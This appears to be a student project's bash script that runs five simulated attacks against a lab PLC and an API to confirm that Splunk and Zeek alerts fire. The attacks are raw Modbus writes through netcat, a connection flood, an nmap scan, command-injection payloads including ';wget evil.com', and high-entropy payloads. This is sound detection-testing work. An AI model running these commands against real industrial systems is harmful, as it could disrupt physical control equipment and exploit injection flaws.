#!/bin/bash
# ============================================
# OT SECURITY ATTACK SIMULATION DEMO
# For your current setup:
#   - PLC: 192.168.18.41:1502
#   - OT Puller API: 172.20.96.57:8090
# ============================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo "╔══════════════════════════════════════════════════════════════╗"
echo "║     OT SECURITY FRAMEWORK - ATTACK DEMONSTRATION             ║"
echo "║                   Final Year Project                         ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo ""

# ------------------------------------------------------------------
# ATTACK 1: Unauthorized External PLC Access
# ------------------------------------------------------------------
echo -e "${YELLOW}[ATTACK 1/5]${NC} Unauthorized External PLC Access"
echo "  Target: PLC at 192.168.0.103:1502"
echo "  Expected Alert: OT: External PLC Connection (sid:6000002)"
echo ""
echo -e "  ${GREEN}Executing...${NC}"
echo -e "\x00\x01\x00\x00\x00\x06\x01\x5a\x00\x00\x00\x01" | nc -v -w 2 192.168.0.103 1502 2>&1
echo -e "  ${GREEN}✓ Attack complete${NC}"
echo ""
sleep 2

# ------------------------------------------------------------------
# ATTACK 2: PLC Connection Flood (DoS)
# ------------------------------------------------------------------
echo -e "${YELLOW}[ATTACK 2/5]${NC} PLC Connection Flood (DoS)"
echo "  Target: PLC at 192.168.0.103:1502"
echo "  Expected Alert: OT: Multiple PLC Connection Attempts (sid:6000008)"
echo ""
echo -e "  ${GREEN}Executing 30 connection attempts...${NC}"
SUCCESS=0
for i in {1..30}; do 
    nc -zv -w 1 192.168.0.103 1502 2>&1 | grep -q "open" && ((SUCCESS++))
done
echo -e "  ${GREEN}✓ Attack complete (${SUCCESS}/30 connections successful)${NC}"
echo ""
sleep 2

# ------------------------------------------------------------------
# ATTACK 3: OT Port Scan (Reconnaissance)
# ------------------------------------------------------------------
echo -e "${YELLOW}[ATTACK 3/5]${NC} OT Port Scan (Reconnaissance)"
echo "  Target: PLC at 192.168.0.103"
echo "  Expected Alert: OT: OT Port Scan Detected (sid:1000009)"
echo ""
echo -e "  ${GREEN}Executing port scan...${NC}"
nmap -p 1502,502,5672,8090,9090 192.168.0.103 2>/dev/null | grep -E "open|PORT|filtered"
echo -e "  ${GREEN}✓ Attack complete${NC}"
echo ""
sleep 2

# ------------------------------------------------------------------
# ATTACK 4: Command Injection via API
# ------------------------------------------------------------------
echo -e "${YELLOW}[ATTACK 4/5]${NC} Command Injection (Web API)"
echo "  Target: OT Puller API at 172.20.96.57:8090"
echo "  Expected Alert: OT: Possible Command Injection (sid:6000003-6000007)"
echo ""
echo -e "  ${GREEN}Executing injection attempts...${NC}"
# Test 1: whoami injection
curl -s -X POST "http://172.20.96.57:8090/direct-write/test?value=;whoami" 2>/dev/null | head -c 100
echo ""
# Test 2: wget injection
curl -s -X POST "http://172.20.96.57:8090/direct-write/test?value=;wget%20evil.com" 2>/dev/null | head -c 100
echo ""
echo -e "  ${GREEN}✓ Attack complete${NC}"
echo ""
sleep 2

# ------------------------------------------------------------------
# ATTACK 5: ML-Based Slow Drip Anomaly
# ------------------------------------------------------------------
echo -e "${YELLOW}[ATTACK 5/5]${NC} ML-Based Slow Drip Anomaly"
echo "  Target: PLC at 192.168.0.103:1502"
echo "  Expected Alert: Zeek ANOMALY_PAYLOAD_ENTROPY (ML detection)"
echo ""
echo -e "  ${GREEN}Executing 3 anomalous commands with high entropy...${NC}"
for i in 1 2 3; do
    # Generate random high-entropy payload (simulating encoded malicious command)
    RANDOM_PAYLOAD=$(openssl rand -hex 12)
    echo -e "  Sending payload: $RANDOM_PAYLOAD"
    echo -e "\x00\x01\x00\x00\x00\x06\x01\x5a$RANDOM_PAYLOAD" | nc -v -w 1 192.168.0.103 1502 2>/dev/null
    sleep 2
done
echo -e "  ${GREEN}✓ Attack complete${NC}"
echo ""

# ------------------------------------------------------------------
# Summary
# ------------------------------------------------------------------
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║  ${GREEN}ALL ATTACKS COMPLETED${NC}                                              ║"
echo "║                                                              ║"
echo "║  Check Splunk for these alerts:                              ║"
echo "║  • OT: External PLC Connection                               ║"
echo "║  • OT: Multiple PLC Connection Attempts                      ║"
echo "║  • OT: OT Port Scan Detected                                 ║"
echo "║  • OT: Possible Command Injection                            ║"
echo "║  • Zeek ANOMALY_PAYLOAD_ENTROPY (ML detection)               ║"
echo "╚══════════════════════════════════════════════════════════════╝"
                            
